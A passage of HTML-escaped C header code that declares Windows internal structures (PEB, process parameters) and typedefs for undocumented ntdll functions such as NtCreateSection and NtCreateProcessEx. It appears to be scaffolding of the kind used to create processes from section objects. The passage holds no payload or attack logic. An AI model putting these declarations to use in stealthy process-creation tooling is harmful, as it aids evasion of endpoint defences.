/>#define&nbsp;PS_INHERIT_HANDLES&nbsp;4<br />#define&nbsp;RTL_USER_PROCESS_PARAMETERS_NORMALIZED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01<br /><br />//&nbsp;peb<br />#define&nbsp;GDI_HANDLE_BUFFER_SIZE32&nbsp;&nbsp;&nbsp;&nbsp;34<br />#define&nbsp;GDI_HANDLE_BUFFER_SIZE64&nbsp;&nbsp;&nbsp;&nbsp;60<br /><br />#ifndef&nbsp;_WIN64<br />#define&nbsp;GDI_HANDLE_BUFFER_SIZE&nbsp;GDI_HANDLE_BUFFER_SIZE32<br />#else<br />#define&nbsp;GDI_HANDLE_BUFFER_SIZE&nbsp;GDI_HANDLE_BUFFER_SIZE64<br />#endif<br /><br />typedef&nbsp;ULONG&nbsp;GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];<br />typedef&nbsp;ULONG&nbsp;GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];<br />typedef&nbsp;ULONG&nbsp;GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];<br /><br />typedef&nbsp;struct&nbsp;_myPEB<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;InheritedAddressSpace;<br />&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;ReadImageFileExecOptions;<br />&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;BeingDebugged;<br />&nbsp;&nbsp;&nbsp;&nbsp;union<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;BitField;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;ImageUsesLargePages&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;IsProtectedProcess&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;IsImageDynamicallyRelocated&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;SkipPatchingUser32Forwarders&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;IsPackagedProcess&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;IsAppContainer&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;IsProtectedProcessLight&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOOLEAN&nbsp;IsLongPathAwareProcess&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;s1;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;u1;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;Mutant;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ImageBaseAddress;<br />&nbsp;&nbsp;&nbsp;&nbsp;PPEB_LDR_DATA&nbsp;Ldr;<br />&nbsp;&nbsp;&nbsp;&nbsp;PRTL_USER_PROCESS_PARAMETERS&nbsp;ProcessParameters;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;SubSystemData;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ProcessHeap;<br />&nbsp;&nbsp;&nbsp;&nbsp;PRTL_CRITICAL_SECTION&nbsp;FastPebLock;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;AtlThunkSListPtr;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;IFEOKey;<br />&nbsp;&nbsp;&nbsp;&nbsp;union<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CrossProcessFlags;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessInJob&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessInitializing&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessUsingVEH&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessUsingVCH&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessUsingFTH&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessPreviouslyThrottled&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessCurrentlyThrottled&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ReservedBits0&nbsp;:&nbsp;25;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;s2;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;u2;<br />&nbsp;&nbsp;&nbsp;&nbsp;union<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;KernelCallbackTable;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;UserSharedInfoPtr;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;u3;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;SystemReserved[1];<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;AtlThunkSListPtr32;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ApiSetMap;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;TlsExpansionCounter;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;TlsBitmap;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;TlsBitmapBits[2];<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ReadOnlySharedMemoryBase;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;SharedData;&nbsp;//&nbsp;HotpatchInformation<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID*&nbsp;ReadOnlyStaticServerData;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;AnsiCodePageData;&nbsp;//&nbsp;PCPTABLEINFO<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;OemCodePageData;&nbsp;//&nbsp;PCPTABLEINFO<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;UnicodeCaseTableData;&nbsp;//&nbsp;PNLSTABLEINFO<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;NumberOfProcessors;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;NtGlobalFlag;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;CriticalSectionTimeout;<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;HeapSegmentReserve;<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;HeapSegmentCommit;<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;HeapDeCommitTotalFreeThreshold;<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;HeapDeCommitFreeBlockThreshold;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;NumberOfHeaps;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;MaximumNumberOfHeaps;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID*&nbsp;ProcessHeaps;&nbsp;//&nbsp;PHEAP<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;GdiSharedHandleTable;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ProcessStarterHelper;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;GdiDCAttributeList;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PRTL_CRITICAL_SECTION&nbsp;LoaderLock;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;OSMajorVersion;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;OSMinorVersion;<br />&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;OSBuildNumber;<br />&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;OSCSDVersion;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;OSPlatformId;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ImageSubsystem;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ImageSubsystemMajorVersion;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ImageSubsystemMinorVersion;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;ActiveProcessAffinityMask;<br />&nbsp;&nbsp;&nbsp;&nbsp;GDI_HANDLE_BUFFER&nbsp;GdiHandleBuffer;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;PostProcessInitRoutine;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;TlsExpansionBitmap;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;TlsExpansionBitmapBits[32];<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;SessionId;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULARGE_INTEGER&nbsp;AppCompatFlags;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULARGE_INTEGER&nbsp;AppCompatFlagsUser;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;pShimData;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;AppCompatInfo;&nbsp;//&nbsp;APPCOMPAT_EXE_DATA<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;CSDVersion;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ActivationContextData;&nbsp;//&nbsp;ACTIVATION_CONTEXT_DATA<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;ProcessAssemblyStorageMap;&nbsp;//&nbsp;ASSEMBLY_STORAGE_MAP<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;SystemDefaultActivationContextData;&nbsp;//&nbsp;ACTIVATION_CONTEXT_DATA<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;SystemAssemblyStorageMap;&nbsp;//&nbsp;ASSEMBLY_STORAGE_MAP<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;MinimumStackCommit;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID*&nbsp;FlsCallback;<br />&nbsp;&nbsp;&nbsp;&nbsp;LIST_ENTRY&nbsp;FlsListHead;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;FlsBitmap;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;FlsBitmapBits[FLS_MAXIMUM_AVAILABLE&nbsp;/&nbsp;(sizeof(ULONG)&nbsp;*&nbsp;8)];<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;FlsHighIndex;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;WerRegistrationData;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;WerShipAssertPtr;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;pUnused;&nbsp;//&nbsp;pContextData<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;pImageHeaderHash;<br />&nbsp;&nbsp;&nbsp;&nbsp;union<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;TracingFlags;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;HeapTracingEnabled&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CritSecTracingEnabled&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;LibLoaderTracingEnabled&nbsp;:&nbsp;1;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;SpareTracingBits&nbsp;:&nbsp;29;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;s3;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;u4;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONGLONG&nbsp;CsrServerReadOnlySharedMemoryBase;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;TppWorkerpListLock;<br />&nbsp;&nbsp;&nbsp;&nbsp;LIST_ENTRY&nbsp;TppWorkerpList;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;WaitOnAddressHashTable[128];<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;TelemetryCoverageHeader;&nbsp;//&nbsp;REDSTONE3<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CloudFileFlags;<br />}&nbsp;myPEB,&nbsp;*&nbsp;myPPEB;<br /><br />//&nbsp;RTL_USER_PROCESS_PARAMETERS<br />typedef&nbsp;struct&nbsp;_CURDIR<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;DosPath;<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;Handle;<br />}&nbsp;CURDIR,&nbsp;*&nbsp;PCURDIR;<br /><br />#define&nbsp;RTL_USER_PROC_CURDIR_CLOSE&nbsp;0x00000002<br />#define&nbsp;RTL_USER_PROC_CURDIR_INHERIT&nbsp;0x00000003<br /><br />typedef&nbsp;struct&nbsp;_RTL_DRIVE_LETTER_CURDIR<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;Flags;<br />&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;Length;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;TimeStamp;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;DosPath;<br />}&nbsp;RTL_DRIVE_LETTER_CURDIR,&nbsp;*&nbsp;PRTL_DRIVE_LETTER_CURDIR;<br /><br />#define&nbsp;RTL_MAX_DRIVE_LETTERS&nbsp;32<br />#define&nbsp;RTL_DRIVE_LETTER_VALID&nbsp;(USHORT)0x0001<br /><br />typedef&nbsp;struct&nbsp;_myRTL_USER_PROCESS_PARAMETERS<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;MaximumLength;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Length;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Flags;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;DebugFlags;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;ConsoleHandle;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ConsoleFlags;<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;StandardInput;<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;StandardOutput;<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;StandardError;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;CURDIR&nbsp;CurrentDirectory;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;DllPath;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;ImagePathName;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;CommandLine;<br />&nbsp;&nbsp;&nbsp;&nbsp;PWCHAR&nbsp;Environment;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;StartingX;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;StartingY;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CountX;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CountY;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CountCharsX;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;CountCharsY;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;FillAttribute;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;WindowFlags;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ShowWindowFlags;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;WindowTitle;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;DesktopInfo;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;ShellInfo;<br />&nbsp;&nbsp;&nbsp;&nbsp;UNICODE_STRING&nbsp;RuntimeData;<br />&nbsp;&nbsp;&nbsp;&nbsp;RTL_DRIVE_LETTER_CURDIR&nbsp;CurrentDirectories[RTL_MAX_DRIVE_LETTERS];<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;EnvironmentSize;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;EnvironmentVersion;<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;PackageDependencyData;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;ProcessGroupId;<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;LoaderThreads;<br />}&nbsp;myRTL_USER_PROCESS_PARAMETERS,&nbsp;*&nbsp;myPRTL_USER_PROCESS_PARAMETERS;<br /><br />//&nbsp;ntdll.h<br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_NtCreateSection)(<br />	PHANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionHandle,<br />	ACCESS_MASK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DesiredAccess,<br />	POBJECT_ATTRIBUTES&nbsp;ObjectAttributes,<br />	PLARGE_INTEGER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MaximumSize,<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionPageProtection,<br />	ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AllocationAttributes,<br />	HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileHandle<br />	);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_NtClose)(<br />	_In_&nbsp;HANDLE&nbsp;Handle<br />	);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_NtCreateProcessEx)(<br />	OUT&nbsp;PHANDLE				ProcessHandle,<br />	IN&nbsp;ACCESS_MASK			DesiredAccess,<br />	IN&nbsp;POBJECT_ATTRIBUTES	ObjectAttributes&nbsp;&nbsp;OPTIONAL,<br />	IN&nbsp;HANDLE				ParentProcess,<br />	IN&nbsp;ULONG				Flags,<br />	IN&nbsp;HANDLE				SectionHandle&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIONAL,<br />	IN&nbsp;HANDLE				DebugPort		&nbsp;&nbsp;OPTIONAL,<br />	IN&nbsp;HANDLE				ExceptionPort&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPTIONAL,<br />	IN&nbsp;BOOLEAN				InJob<br />	);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_NtQueryInformationProcess)(<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;PROCESSINFOCLASS&nbsp;ProcessInformationClass,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessInformation,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessInformationLength,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReturnLength<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_NtReadVirtualMemory)(<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHandle,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BaseAddress,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Buffer,<br />&nbsp;&nbsp;&nbsp;&nbsp;IN&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NumberOfBytesToRead,<br />&nbsp;&nbsp;&nbsp;&nbsp;OUT&nbsp;PULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NumberOfBytesReaded&nbsp;OPTIONAL<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_RtlInitUnicodeString)(<br />&nbsp;&nbsp;&nbsp;&nbsp;_Out_&nbsp;PUNICODE_STRING&nbsp;DestinationString,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PWSTR&nbsp;SourceString<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_RtlCreateProcessParametersEx)(<br />&nbsp;&nbsp;&nbsp;&nbsp;_Out_&nbsp;PRTL_USER_PROCESS_PARAMETERS*&nbsp;pProcessParameters,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;PUNICODE_STRING&nbsp;ImagePathName,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;DllPath,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;CurrentDirectory,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;CommandLine,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PVOID&nbsp;Environment,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;WindowTitle,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;DesktopInfo,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;ShellInfo,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_opt_&nbsp;PUNICODE_STRING&nbsp;RuntimeData,<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;ULONG&nbsp;Flags&nbsp;//&nbsp;Pass&nbsp;RTL_USER_PROCESS_PARAMETERS_NORMALIZED&nbsp;to&nbsp;keep&nbsp;parameters&nbsp;normalized<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;t_RtlDestroyProcessParameters)(<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;PRTL_USER_PROCESS_PARAMETERS&nbsp;ProcessParameters<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />typedef&nbsp;NTSTATUS(NTAPI*&nbsp;PUSER_THREAD_START_ROUTINE)(<br />&nbsp;&nbsp;&nbsp;&nbsp;_In_&nbsp;PVOID&nbsp;ThreadParameter<br />&nbsp;&nbsp;&nbsp;&nbsp;);<br /><br />typedef&nbsp;struct&nbsp;_PS_ATTRIBUTE<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;Attribute;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;PROC_THREAD_ATTRIBUTE_XXX&nbsp;|&nbsp;PROC_THREAD_ATTRIBUTE_XXX&nbsp;modifiers,&nbsp;see&nbsp;ProcThreadAttributeValue&nbsp;macro&nbsp;and&nbsp;Windows&nbsp;Internals&nbsp;6&nbsp;(372)<br />&nbsp;&nbsp;&nbsp;&nbsp;SIZE_T&nbsp;Size;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Size&nbsp;of&nbsp;Value&nbsp;or&nbsp;*ValuePtr<br 